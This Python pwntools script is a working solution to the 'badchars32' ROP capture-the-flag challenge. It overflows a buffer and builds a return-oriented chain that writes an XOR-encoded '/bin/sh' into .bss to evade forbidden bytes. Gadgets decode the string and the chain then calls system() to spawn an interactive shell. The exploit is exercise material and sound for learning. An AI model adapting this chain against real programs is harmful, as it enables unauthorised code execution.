from pwn import *

context(os="linux", arch="i386")

#
# badchars are: b i c / <space> f n s
#

def main():
    conn = process("./badchars32")

    system      = 0x80484e0
    pop3ret     = 0x80488f9  # pop esi ; pop edi ; pop ebp ; ret
    pop2ret     = 0x8048896  # pop ebx ; pop ecx ; ret
    bss_addr    = 0x804a040 + 0x10  # buffer, 使用する領域はbssの中間がいいらしい？
    mov_edi_esi = 0x8048893  # mov dword ptr [edi], esi ; ret
    xor_ebx_cl  = 0x8048890  # xor    BYTE PTR [ebx],cl

    # ROP chain
    payload = b""
    payload += b"A" * (0x2c+4)

    payload += p32(pop3ret)
    payload += b"\x1d\x72\x79\x7e"  # /bin, 全てbadcharsなのでxor (/ ^ 0x32, bin ^ 0x10), esi
    payload += p32(bss_addr)  # edi
    payload += b'A' * 4  # padding(ebp)
    payload += p32(mov_edi_esi)

    payload += p32(pop3ret)
    payload += b"\x1d\x61\x68\x00"  # /sh\00, / と s はbadcharsなのでxor (/ ^ 0x32, s ^ 0x12), esi
    payload += p32(bss_addr + 4)  # edi
    payload += b"B" * 4  # adding(ebp)
    payload += p32(mov_edi_esi)

    payload += p32(pop2ret)
    payload += p32(bss_addr)  # \x1d, ebx
    payload += p32(0x32)  # ecx
    payload += p32(xor_ebx_cl)  # /

    payload += p32(pop2ret)
    payload += p32(bss_addr + 1)  # \x72, ebx
    payload += p32(0x10)  # ecx
    payload += p32(xor_ebx_cl)  # b

    payload += p32(pop2ret)
    payload += p32(bss_addr + 2)  # \x79, ebx
    payload += p32(0x10)  # ecx
    payload += p32(xor_ebx_cl)  # i

    payload += p32(pop2ret)
    payload += p32(bss_addr + 3)  # \x7e, ebx
    payload += p32(0x10)  # ecx
    payload += p32(xor_ebx_cl)  # n

    payload += p32(pop2ret)
    payload += p32(bss_addr + 4)  # \x1d, ebx
    payload += p32(0x32)  # ecx
    payload += p32(xor_ebx_cl)  # /

    payload += p32(pop2ret)
    payload += p32(bss_addr + 5)  # \x61, ebx
    payload += p32(0x12)  # ecx
    payload += p32(xor_ebx_cl)  # s

    payload += p32(system)
    payload += b"C" * 4  # padding
    payload += p32(bss_addr)  # buffer

    conn.recv(100)

    conn.send(payload)
    conn.interactive()


if __name__ == "__main__":
    main()